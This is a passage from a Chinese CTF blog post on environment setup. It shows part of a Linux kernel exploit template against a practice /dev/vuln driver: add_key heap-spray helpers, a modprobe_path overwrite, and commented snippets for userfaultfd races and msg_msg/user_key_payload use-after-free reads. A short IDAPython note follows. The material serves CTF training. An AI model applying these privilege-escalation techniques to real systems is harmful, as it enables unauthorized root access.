class="line"></span><br><span class="line">  assert((payload_buf = <span class="built_in">malloc</span>(size)) != <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">strncpy</span>(payload_buf, payload, size);</span><br><span class="line"></span><br><span class="line">  assert((key = syscall_x64(SYS_add_key, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;kernel-pwn-key&quot;</span>, payload_buf, size,</span><br><span class="line">                        KEY_SPEC_PROCESS_KEYRING)) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[spray_addkey] add_key = %x\n&quot;</span>, key);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">spray_readkey</span><span class="params">(<span class="type">key_serial_t</span> key, <span class="type">uint32_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *payload;</span><br><span class="line"></span><br><span class="line">  assert((payload = <span class="built_in">malloc</span>(size)) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  assert(syscall_x64(SYS_keyctl, KEYCTL_READ, key, payload, size, <span class="number">0</span>) == size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> payload;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 本次exp的符号定义</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VULN_WRITE		0x1737</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VULN_READ		0x1738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VULN_ALLOC		0x1739</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VULN_FREE		0x173A</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> *modprobe_path = (<span class="type">long</span> <span class="type">long</span>*) <span class="number">0xffffffff82651120</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> fake_modprobe_path = <span class="number">0x612f706d742f</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> *addr;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> val;</span><br><span class="line">&#125; Data;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">uf_handler</span><span class="params">(<span class="type">void</span> *page)</span></span><br><span class="line">&#123;</span><br><span class="line">    Data *data = (Data *)page;</span><br><span class="line">    data-&gt;addr = modprobe_path;</span><br><span class="line">    data-&gt;val = fake_modprobe_path;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">uf_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(ioctl(gfd1, VULN_WRITE, gaddr1) == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 尝试使用modprobe进行提权</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//int fd;</span></span><br><span class="line">    <span class="comment">//Data data;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//assert((fd = open(&quot;/dev/vuln&quot;, O_RDWR)) &gt;= 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//data.addr = modprobe_path;</span></span><br><span class="line">    <span class="comment">//data.val = fake_modprobe_path;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//assert(ioctl(fd, VULN_WRITE, &amp;data) == 0);</span></span><br><span class="line">    <span class="comment">//modprobe_exp();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">///* 尝试使用userfaultfd扩大条件竞争</span></span><br><span class="line">    <span class="comment">// */</span></span><br><span class="line">    <span class="comment">//Data data;</span></span><br><span class="line">    <span class="comment">//long long buf;</span></span><br><span class="line">    <span class="comment">//uint64_t len;</span></span><br><span class="line">    <span class="comment">//pthread_t thread;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//len = 0x1000;</span></span><br><span class="line">    <span class="comment">//assert((gfd1 = open(&quot;/dev/vuln&quot;, O_RDWR)) &gt;= 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 注册userfaultfd，并通过ur_thr触发page fault</span></span><br><span class="line">    <span class="comment">//assert((gaddr1 = mmap(NULL, len, PROT_READ | PROT_WRITE,</span></span><br><span class="line">    <span class="comment">//                    MAP_PRIVATE | MAP_ANONYMOUS, -1 ,0))</span></span><br><span class="line">    <span class="comment">//       != MAP_FAILED);</span></span><br><span class="line">    <span class="comment">//thread = userfaultfd_exp(gaddr1, len, uf_thread, uf_handler);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 此时page fault还未处理完，条件竞争读取modprobe_path值</span></span><br><span class="line">    <span class="comment">//data.addr = modprobe_path;</span></span><br><span class="line">    <span class="comment">//data.val = (long long)&amp;buf;</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_READ, &amp;data) == 0);</span></span><br><span class="line">    <span class="comment">//assert(buf != fake_modprobe_path);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 等待uf_thr终止</span></span><br><span class="line">    <span class="comment">//assert(pthread_join(thread, NULL) == 0);</span></span><br><span class="line">    <span class="comment">//modprobe_exp();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">///* 尝试利用struct msg_msg结构体</span></span><br><span class="line">    <span class="comment">// * 进行数据读取或写入</span></span><br><span class="line">    <span class="comment">// */</span></span><br><span class="line">    <span class="comment">//Data data;</span></span><br><span class="line">    <span class="comment">//char *kbuf1, *kbuf2;</span></span><br><span class="line">    <span class="comment">//int qid, size = 0x80;</span></span><br><span class="line">    <span class="comment">//assert((gfd1 = open(&quot;/dev/vuln&quot;, O_RDWR)) &gt;= 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 内核态申请0x80大小的内存</span></span><br><span class="line">    <span class="comment">//data.val = size;</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_ALLOC, &amp;data) == 0)</span></span><br><span class="line">    <span class="comment">//kbuf1 = (char *)data.addr;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 制造UAF</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_FREE, &amp;data) == 0)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 开始heap spray</span></span><br><span class="line">    <span class="comment">//qid = send_msg_str(size, &quot;hhaawwkk1&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 利用UAF修改struct msg_msg的m_ts字段</span></span><br><span class="line">    <span class="comment">//data.addr = (long long*)(kbuf1 + offsetof(struct msg_msg, m_ts));</span></span><br><span class="line">    <span class="comment">//data.val = 0x1000;</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_WRITE, &amp;data) == 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//assert((kbuf2 = recv_msg_nocopy(qid, 0x1000)) != NULL);</span></span><br><span class="line">    <span class="comment">//assert(((long long)kbuf1 + 0x100) == ((long long*)kbuf2)[0x13]);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">///* 尝试利用struct user_key_payload结构体</span></span><br><span class="line">    <span class="comment">// * 进行数据读取或写入</span></span><br><span class="line">    <span class="comment">// */</span></span><br><span class="line">    <span class="comment">//Data data;</span></span><br><span class="line">    <span class="comment">//char *kbuf1, *kbuf2;</span></span><br><span class="line">    <span class="comment">//int size = 0x70;</span></span><br><span class="line">    <span class="comment">//key_serial_t key;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//assert((gfd1 = open(&quot;/dev/vuln&quot;, O_RDWR)) &gt;= 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 内核态申请0x80大小的内存</span></span><br><span class="line">    <span class="comment">//data.val = size;</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_ALLOC, &amp;data) == 0)</span></span><br><span class="line">    <span class="comment">//kbuf1 = (char *)data.addr;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 制造UAF</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_FREE, &amp;data) == 0)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 开始heap spray</span></span><br><span class="line">    <span class="comment">//key = spray_addkey(&quot;hhaawwkk1&quot;, size);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 利用UAF修改struct user_key_payload的datalen字段</span></span><br><span class="line">    <span class="comment">//data.addr = (long long*)(kbuf1 + offsetof(struct user_key_payload, datalen));</span></span><br><span class="line">    <span class="comment">//data.val = 0x1000;</span></span><br><span class="line">    <span class="comment">//assert(ioctl(gfd1, VULN_WRITE, &amp;data) == 0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//kbuf2 = spray_readkey(key, 0x1000);</span></span><br><span class="line">    <span class="comment">//assert(((long long)kbuf1 + 0x100) == ((long long*)kbuf2)[0x15]);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>  IDA是世界上顶级的交互式反汇编工具，往往使用<strong>IDA</strong>静态分析程序，从而理清程序中的代码组织结构，并统计相关资源信息</p>
<h2 id="IDAPython"><a href="#IDAPython" class="headerlink" title="IDAPython"></a>IDAPython</h2><p>  这是IDA的一个插件，允许IDA执行相关的<em>python</em>脚本信息。其中，该插件提供了大量的<a target="_blank" rel="noopener" href="https://hex-rays.com/products/ida/support/idapython_docs/frames.html">IDA接口</a>，从而可以方便的获取程序的相关信息，我们将其整理成如下模板<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	获取虚拟地址处的1字节的值</span></span><br><span class="line"><span class="string">	返回的是整形</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">val = ida_bytes.get_byte(address)</span><br></pre></td></tr></table></figure></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">H4wk1ns</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jiaweihawk.github.io/2021/07/21/ctf%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">https://jiaweihawk.github.io/2021/07/21/ctf环境配置/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jiaweihawk.github.io" target="_blank">H4wk1ns's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%AE%BE%E7%BD%AE/">设置</a><a class="post-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a></div><div class="post_share"><div class="social-share" data-image="/img/background.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/07/15/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3const/"><img class="prev-cover" src="/img/background.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">深入了解const</div></div></a></div><div class="next-post pull-right"><a href="/2021/07/22/%E8%B0%83%E7%94%A8%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E7%AC%A6%E5%8F%B7/"><img class="next-cover" src="/img/background.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">调用汇编代码符号</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/06/05/manjaro配置/" title="manjaro配置"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-05</div><div class="title">manjaro配置</div></div></a></div><div><a href="/2021/05/24/博客设置/" title="基于Butterfly主题的hexo静态博客"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-24</div><div class="title">基于Butterfly主题的hexo静态博客</div></div></a></div><div><a href="/2021/10/21/glibc2-31下largebin攻击/" title="glibc2.31下largebin攻击"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-21</div><div class="title">glibc2.31下largebin攻击</div></div></a></div><div><a href="/2021/09/08/malloc-consolidate和unlink/" title="malloc_consolidate和unlink"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-08</div><div class="title">malloc_consolidate和unlink</div></div></a></div><div><a href="/2021/09/03/tcache中的double-free/" title="tcache中的double free"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-03</div><div class="title">tcache中的double free</div></div></a></div><div><a href="/2021/09/10/巧妙的爆破/" title="巧妙的爆破"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-10</div><div class="title">巧妙的爆破</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/profile.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">H4wk1ns</div><div class="author-info__description">coder && ctfer</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/jiaweihawk"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/static/cv/cv_zh.pdf" target="_blank" title="个人简历"><i class="fa-solid fa-file-pdf"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">PWN环境</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ubuntu16-04"><span class="toc-number">2.1.</span> <span class="toc-text">ubuntu16.04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ubuntu18-04"><span class="toc-number">2.2.</span> <span class="toc-text">ubuntu18.04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ubuntu20-04"><span class="toc-number">2.3.</span> <span class="toc-text">ubuntu20.04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ubuntu22-04"><span class="toc-number">2.4.</span> <span class="toc-text">ubuntu22.04</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#patchelf"><span class="toc-number">3.</span> <span class="toc-text">patchelf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dynamic-loader"><span class="toc-number">3.1.</span> <span class="toc-text">dynamic loader</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#runtime-path"><span class="toc-number">3.2.</span> <span class="toc-text">runtime path</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LD-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">4.</span> <span class="toc-text">LD_*环境变量</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-DEBUG"><span class="toc-number">4.1.</span> <span class="toc-text">LD_DEBUG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-LIBRARY-PATH"><span class="toc-number">4.2.</span> <span class="toc-text">LD_LIBRARY_PATH</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GDB%E8%B0%83%E8%AF%95%E5%99%A8"><span class="toc-number">5.</span> <span class="toc-text">GDB调试器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">5.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">5.2.</span> <span class="toc-text">命令执行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwntools%E5%BA%93"><span class="toc-number">6.</span> <span class="toc-text">pwntools库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN%E6%A8%A1%E6%9D%BF"><span class="toc-number">6.1.</span> <span class="toc-text">PWN模板</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kernel"><span class="toc-number">7.</span> <span class="toc-text">Kernel</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6"><span class="toc-number">7.1.</span> <span class="toc-text">文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%96%87%E4%BB%B6"><span class="toc-number">7.1.1.</span> <span class="toc-text">内核文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6"><span class="toc-number">7.1.2.</span> <span class="toc-text">镜像文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">7.2.</span> <span class="toc-text">结构体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#busybox"><span class="toc-number">7.3.</span> <span class="toc-text">busybox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%8C%82%E8%BD%BD%E7%9B%AE%E5%BD%95"><span class="toc-number">7.3.1.</span> <span class="toc-text">创建挂载目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-inittab"><span class="toc-number">7.3.2.</span> <span class="toc-text">&#x2F;etc&#x2F;inittab</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-init-d-rcS"><span class="toc-number">7.3.3.</span> <span class="toc-text">&#x2F;etc&#x2F;init.d&#x2F;rcS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu"><span class="toc-number">7.4.</span> <span class="toc-text">qemu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">7.5.</span> <span class="toc-text">模板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">7.5.1.</span> <span class="toc-text">qemu启动脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">7.5.2.</span> <span class="toc-text">gdb配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">7.5.3.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">7.5.3.1.</span> <span class="toc-text">系统调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BPF%E5%A7%BF%E5%8A%BF"><span class="toc-number">7.5.3.2.</span> <span class="toc-text">BPF姿势</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%A7%BF%E5%8A%BF"><span class="toc-number">7.5.3.3.</span> <span class="toc-text">模板姿势</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IDA"><span class="toc-number">8.</span> <span class="toc-text">IDA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IDAPython"><span class="toc-number">8.1.</span> <span class="toc-text">IDAPython</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/23/virtio%E7%AE%80%E4%BB%8B/" title="virtio简介">virtio简介</a><time datetime="2024-08-23T15:05:52.000Z" title="发表于 2024-08-23 23:05:52">2024-08-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/04/qemu%E7%9A%84PCI%E8%AE%BE%E5%A4%87/" title="qemu的PCI设备">qemu的PCI设备</a><time datetime="2024-08-04T04:33:06.000Z" title="发表于 2024-08-04 12:33:06">2024-08-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/31/qemu%E8%AE%BE%E5%A4%87%E6%A8%A1%E5%9E%8B/" title="qemu设备模型">qemu设备模型</a><time datetime="2024-07-31T15:38:12.000Z" title="发表于 2024-07-31 23:38:12">2024-07-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/20/qemu%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/" title="qemu内存模型">qemu内存模型</a><time datetime="2024-07-20T01:37:13.000Z" title="发表于 2024-07-20 09:37:13">2024-07-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/14/%E7%BD%91%E5%8D%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E6%A0%88/" title="网卡与网络栈">网卡与网络栈</a><time datetime="2024-04-14T10:24:48.000Z" title="发表于 2024-04-14 18:24:48">2024-04-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2024 By H4wk1ns</div><div class="footer_custom_text">come to hack me!!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    loader: {
      source: {
        '[tex]/amsCd': '[tex]/amscd'
      }
    },
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        addClass: [200,() => {
          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
            const target = node.parentNode
            if (!target.classList.contains('has-jax')) {
              target.classList.add('mathjax-overflow')
            }
          })
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>